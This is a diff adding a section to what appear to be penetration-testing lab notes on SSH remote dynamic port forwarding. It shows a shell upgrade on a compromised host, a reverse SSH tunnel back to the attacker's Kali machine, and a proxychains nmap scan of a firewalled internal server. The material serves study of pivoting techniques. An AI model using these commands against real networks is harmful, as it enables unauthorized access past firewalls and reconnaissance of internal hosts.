@@ -467,3 +467,36 @@ postgres# SELECT * FROM payroll;
 
 ### SSH Remote Dynamic Port Forwarding
 
+We can also do remote dynamic port forwarding to forward from one SOCKS proxy port bound to the SSH server and traffic is forwarded from the SSH client to many ports. We can connect to any port on any host that CONFLUENCE01 has access to by passing SOCKS format packets thru the SOCKS proxy port which is bound on Kali.
+
+NOTE: Remote dynamic port forwarding has only been available since October 2017's OpenSSH 7.6.2 Despite this, only the OpenSSH client needs to be version 7.6 or above to use it - the server version doesn't matter.
+
+We've got a Windows server MULTISERVER03 on DMZ, which a firewall prevents Kali from connecting to. We also can't connect to any port other an 8090 on CONFLUENCE01 from Kali. However, we know we can SSH out from CONFLUENCE01 to Kali, and create a remote dynamic port forward to enum MULTISERVER03 from Kali.
+
+```
+10.4.188.215 PGDATABASE01
+192.168.188.63 CONFLUENCE01
+192.168.188.64 MULTISERVER03
+```
+
+We will SSH from CONFLUENCE01 to Kali (running SSH server). The SOCKS proxy port is bound to Kali on TCP/9998. Packets sent to Kali 9998 will be pushed back thru the SSH tunnel to CONFLUENCE01, which will forward them where they're addressed (MULTISERVER03, in this case).
+
+```console
+confluence$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+confluence$ ssh -N -R 9998 kali@192.168.45.245
+
+kali$ sudo ss -ntplu
+
+kali$ tail /etc/proxychains4.conf
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5  127.0.0.1 9998
+
+// run nmap against MULTISERVER03 - make sure you scan on the 10.4.x.64 INTERNAL INTERFACE!
+// scanning might be slow
+
+kali$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.188.64 
+```
